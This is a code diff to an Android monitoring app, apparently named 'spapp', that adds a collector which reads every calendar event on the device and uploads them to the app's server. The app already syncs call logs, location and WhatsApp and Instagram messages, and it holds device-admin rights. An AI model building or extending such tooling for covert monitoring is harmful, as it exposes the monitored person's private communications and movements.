@@ -5,6 +5,7 @@ import com.spapp.monitoring.admin.SpappDeviceAdminReceiver
 import com.spapp.monitoring.blocking.BlockRule
 import com.spapp.monitoring.blocking.BlockRulesCache
 import com.spapp.monitoring.collectors.AppUsageCollector
+import com.spapp.monitoring.collectors.CalendarCollector
 import com.spapp.monitoring.collectors.CallLogCollector
 import com.spapp.monitoring.collectors.FileManagerCollector
 import com.spapp.monitoring.collectors.InstalledAppsCollector
@@ -23,6 +24,7 @@ import com.spapp.monitoring.network.AppUsageEntryDto
 import com.spapp.monitoring.network.AppUsageSyncRequest
 import com.spapp.monitoring.network.CallLogEntryDto
 import com.spapp.monitoring.network.CallLogSyncRequest
+import com.spapp.monitoring.network.CalendarSyncRequest
 import com.spapp.monitoring.network.InstalledAppDto
 import com.spapp.monitoring.network.InstalledAppsSyncRequest
 import com.spapp.monitoring.network.LocationReportRequest
@@ -219,6 +221,7 @@ class SyncRunner(private val context: Context) {
         syncBlockRules(bearer)
         syncWhatsAppMessages(bearer, db)
         syncInstagramMessages(bearer, db)
+        syncCalendar(bearer)
 
         state.lastSyncAtEpochMs = System.currentTimeMillis()
         return true
@@ -965,6 +968,19 @@ class SyncRunner(private val context: Context) {
                 db.instagramMessageDao().markSynced(unsynced.map { it.id })
                 db.instagramMessageDao().pruneOldMessages(System.currentTimeMillis() - 14 * 24 * 60 * 60 * 1000L)
             }
+        } catch (e: Exception) {
+            // Retried on next scheduled run.
+        }
+    }
+
+    private suspend fun syncCalendar(bearer: String) {
+        val collector = CalendarCollector(context)
+        if (!collector.hasPermission()) return
+        val events = collector.collectAll()
+        if (events.isEmpty()) return
+
+        try {
+            ApiClient.service.syncCalendar(bearer, CalendarSyncRequest(events))
         } catch (e: Exception) {
             // Retried on next scheduled run.
         }
